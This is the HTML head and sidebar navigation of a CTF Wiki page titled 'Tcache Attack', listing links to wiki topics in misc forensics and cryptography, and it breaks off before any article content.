
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="CTF Wiki">
      
      
        <link rel="canonical" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/">
      
      
        <meta name="author" content="CTF Wiki Team">
      
      <link rel="shortcut icon" href="../../../..">
      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.0.2">
    
    
      
        <title>Tcache Attack - CTF Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/main.f1caf91c.min.css">
      
        
        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.3f72e892.min.css">
        
      
    
    
    
      
        
        <link href="https://gstatic.loli.net" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
        <style>body,input{font-family:"Noto Sans",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro",SFMono-Regular,Consolas,Menlo,monospace}</style>
      
    
    
    
      <link rel="stylesheet" href="../../../../_static/css/extra.css">
    
    
      
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="preference" data-md-color-primary="" data-md-color-accent="">
      
        <script>matchMedia("(prefers-color-scheme: dark)").matches&&document.body.setAttribute("data-md-color-scheme","slate")</script>
      
  
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#tcache-makes-heap-exploitation-easy-again" class="md-skip">
          跳转至
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid" aria-label="Header">
    <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-header-nav__button md-logo" aria-label="CTF Wiki">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3L1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"/></svg>

    </a>
    <label class="md-header-nav__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header-nav__title" data-md-component="header-title">
      
        <div class="md-header-nav__ellipsis">
          <span class="md-header-nav__topic md-ellipsis">
            CTF Wiki
          </span>
          <span class="md-header-nav__topic md-ellipsis">
            
              Tcache Attack
            
          </span>
        </div>
      
    </div>
    
      <label class="md-header-nav__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header-nav__source">
        
<a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 GitHub 仓库" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    ctf-wiki/ctf-wiki
  </div>
</a>
      </div>
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-nav__button md-logo" aria-label="CTF Wiki">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3L1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"/></svg>

    </a>
    CTF Wiki
  </label>
  
    <div class="md-nav__source">
      
<a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 GitHub 仓库" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    ctf-wiki/ctf-wiki
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
    
    <label class="md-nav__link" for="nav-1">
      Introduction
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Introduction" data-md-level="1">
      <label class="md-nav__title" for="nav-1">
        <span class="md-nav__icon md-icon"></span>
        Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../.." class="md-nav__link">
      Getting Started
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/history-zh/" class="md-nav__link">
      CTF History
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/mode-zh/" class="md-nav__link">
      Introduction to CTF Competition Form
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/content-zh/" class="md-nav__link">
      CTF Contest Content
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/experience-zh/" class="md-nav__link">
      Offline Attack and Defense Experience Summary
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/cgc-zh/" class="md-nav__link">
      CGC Super Challenge
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/resources-zh/" class="md-nav__link">
      Learning Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
    
    <label class="md-nav__link" for="nav-2">
      Misc
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Misc" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        <span class="md-nav__icon md-icon"></span>
        Misc
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/introduction-zh/" class="md-nav__link">
      Miscellaneous Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/recon-zh/" class="md-nav__link">
      Information Gathering Technology
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
    
    <label class="md-nav__link" for="nav-2-3">
      Code Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Code Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-3">
        <span class="md-nav__icon md-icon"></span>
        Code Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/communication-zh/" class="md-nav__link">
      Commonly Used Coding in the Communication Field
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/computer-zh/" class="md-nav__link">
      Computer Related Coding
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/modern-zh/" class="md-nav__link">
      Commonly Used Encodings in the Real World
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/prefix-zh/" class="md-nav__link">
      Forensic Steganography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5">
    
    <label class="md-nav__link" for="nav-2-5">
      Image Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Image Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-5">
        <span class="md-nav__icon md-icon"></span>
        Image Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/introduction-zh/" class="md-nav__link">
      Introduction to Image Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/png-zh/" class="md-nav__link">
      PNG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/jpg-zh/" class="md-nav__link">
      JPG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/gif-zh/" class="md-nav__link">
      GIF
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6">
    
    <label class="md-nav__link" for="nav-2-6">
      Traffic Packet Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Traffic Packet Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-6">
        <span class="md-nav__icon md-icon"></span>
        Traffic Packet Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/introduction-zh/" class="md-nav__link">
      Introduction to Traffic Packet Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/fix-zh/" class="md-nav__link">
      PCAP File Repairing
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-6-3" type="checkbox" id="nav-2-6-3">
    
    <label class="md-nav__link" for="nav-2-6-3">
      Protocol Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Protocol Analysis" data-md-level="3">
      <label class="md-nav__title" for="nav-2-6-3">
        <span class="md-nav__icon md-icon"></span>
        Protocol Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/README-zh/" class="md-nav__link">
      Overview of Protocol Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/Wireshark-zh/" class="md-nav__link">
      Wireshark
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/HTTP-zh/" class="md-nav__link">
      HTTP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/HTTPS-zh/" class="md-nav__link">
      HTTPS
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/FTP-zh/" class="md-nav__link">
      FTP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/DNS-zh/" class="md-nav__link">
      DNS
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/WIFI-zh/" class="md-nav__link">
      WIFI
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/USB-zh/" class="md-nav__link">
      USB
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/data-zh/" class="md-nav__link">
      Data Extraction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-7" type="checkbox" id="nav-2-7">
    
    <label class="md-nav__link" for="nav-2-7">
      Compressed Package Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Compressed Package Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-7">
        <span class="md-nav__icon md-icon"></span>
        Compressed Package Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/archive/zip-zh/" class="md-nav__link">
      ZIP Format
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/archive/rar-zh/" class="md-nav__link">
      RAR Format
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/audio/introduction-zh/" class="md-nav__link">
      Audio Steganography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-9" type="checkbox" id="nav-2-9">
    
    <label class="md-nav__link" for="nav-2-9">
      Disk Memory Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Disk Memory Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-9">
        <span class="md-nav__icon md-icon"></span>
        Disk Memory Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/disk-memory/introduction-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/disk-memory/problem-zh/" class="md-nav__link">
      Title
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-10" type="checkbox" id="nav-2-10">
    
    <label class="md-nav__link" for="nav-2-10">
      Other
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Other" data-md-level="2">
      <label class="md-nav__title" for="nav-2-10">
        <span class="md-nav__icon md-icon"></span>
        Other
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/other/pyc-zh/" class="md-nav__link">
      pyc File
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      Crypto
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Crypto" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        <span class="md-nav__icon md-icon"></span>
        Crypto
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/introduction-zh/" class="md-nav__link">
      Introduction to Cryptography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
    
    <label class="md-nav__link" for="nav-3-2">
      Basic Mathematics
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Basic Mathematics" data-md-level="2">
      <label class="md-nav__title" for="nav-3-2">
        <span class="md-nav__icon md-icon"></span>
        Basic Mathematics
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/basic/introduction-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
    
    <label class="md-nav__link" for="nav-3-3">
      Classical Cryptography
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Classical Cryptography" data-md-level="2">
      <label class="md-nav__title" for="nav-3-3">
        <span class="md-nav__icon md-icon"></span>
        Classical Cryptography
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/introduction-zh/" class="md-nav__link">
      Introduction to Classical Cryptography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/monoalphabetic-zh/" class="md-nav__link">
      Single table Substitution Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/polyalphabetic-zh/" class="md-nav__link">
      Multi-table Substitution Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/others-zh/" class="md-nav__link">
      Other Types of Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/summary-zh/" class="md-nav__link">
      Summary
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4">
    
    <label class="md-nav__link" for="nav-3-4">
      Stream Cipher
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Stream Cipher" data-md-level="2">
      <label class="md-nav__title" for="nav-3-4">
        <span class="md-nav__icon md-icon"></span>
        Stream Cipher
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/intro-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4-2" type="checkbox" id="nav-3-4-2">
    
    <label class="md-nav__link" for="nav-3-4-2">
      Pseudo Random Number Generator
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Pseudo Random Number Generator" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-2">
        <span class="md-nav__icon md-icon"></span>
        Pseudo Random Number Generator
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/intro-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/csprng-zh/" class="md-nav__link">
      Cryptographic Security Pseudo-random Number Generator
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/problem-zh/" class="md-nav__link">
      Challenge Examples
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4-3" type="checkbox" id="nav-3-4-3">
    
    <label class="md-nav__link" for="nav-3-4-3">
      Linear Congruence Generator
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linear Congruence Generator" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-3">
        <span class="md-nav__icon md-icon"></span>
        Linear Congruence Generator
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/lcg/intro-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/lcg/challenge-zh/" class="md-nav__link">
      Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4-4" type="checkbox" id="nav-3-4-4">
    
    <label class="md-nav__link" for="nav-3-4-4">
      Feedback Shift Register
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Feedback Shift Register" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-4">
        <span class="md-nav__icon md-icon"></span>
        Feedback Shift Register
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/intro-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/lfsr-zh/" class="md-nav__link">
      Linear Feedback Shift Register
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/nfsr-zh/" class="md-nav__link">
      Nonlinear Feedback Shift Register
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4-5" type="checkbox" id="nav-3-4-5">
    
    <label class="md-nav__link" for="nav-3-4-5">
      Special Stream Cipher
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Special Stream Cipher" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-5">
        <span class="md-nav__icon md-icon"></span>
        Special Stream Cipher
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/special/rc4-zh/" class="md-nav__link">
      RC4
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
    
    <label class="md-nav__link" for="nav-3-5">
      Block Cipher
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Block Cipher" data-md-level="2">
      <label class="md-nav__title" for="nav-3-5">
        <span class="md-nav__icon md-icon"></span>
        Block Cipher
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/introduction-zh/" class="md-nav__link">
      Introduction to Block Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/arx-operations-zh/" class="md-nav__link">
      ARX
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/des-zh/" class="md-nav__link">
      DES
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/idea-zh/" class="md-nav__link">
      IDEA
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/aes-zh/" class="md-nav__link">
      AES
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/simon-speck-zh/" class="md-nav__link">
      Simon and Speck
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-5-7" type="checkbox" id="nav-3-5-7">
    
    <label class="md-nav__link" for="nav-3-5-7">
      Group Mode
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Group Mode" data-md-level="3">
      <label class="md-nav__title" for="nav-3-5-7">
        <span class="md-nav__icon md-icon"></span>
        Group Mode
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/introduction-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/padding-zh/" class="md-nav__link">
      Padding Methods
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ecb-zh/" class="md-nav__link">
      ECB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/cbc-zh/" class="md-nav__link">
      CBC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/pcbc-zh/" class="md-nav__link">
      PCBC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/cfb-zh/" class="md-nav__link">
      CFB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ofb-zh/" class="md-nav__link">
      OFB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ctr-zh/" class="md-nav__link">
      CTR
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/padding-oracle-attack-zh/" class="md-nav__link">
      Padding Oracle Attack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-6" type="checkbox" id="nav-3-6">
    
    <label class="md-nav__link" for="nav-3-6">
      Asymmetric Cryptography
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Asymmetric Cryptography" data-md-level="2">
      <label class="md-nav__title" for="nav-3-6">
        <span class="md-nav__icon md-icon"></span>
        Asymmetric Cryptography
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/introduction-zh/" class="md-nav__link">
      Introduction to Asymmetric Cryptography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-6-2" type="checkbox" id="nav-3-6-2">
    
    <label class="md-nav__link" for="nav-3-6-2">
      RSA
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="RSA" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-2">
        <span class="md-nav__icon md-icon"></span>
        RSA
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_theory-zh/" class="md-nav__link">
      RSA Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_module_attack-zh/" class="md-nav__link">
      Modulo-related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
